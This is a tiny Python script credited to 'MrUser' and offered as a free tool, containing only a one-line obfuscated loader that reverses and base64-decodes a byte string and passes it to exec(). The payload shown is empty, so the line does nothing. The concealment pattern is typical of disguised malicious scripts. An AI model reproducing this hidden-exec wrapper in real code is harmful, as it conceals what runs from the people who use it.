#Created by MrUser#
#Free Tool and paid tool#
#Please subscribe to my github channel#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))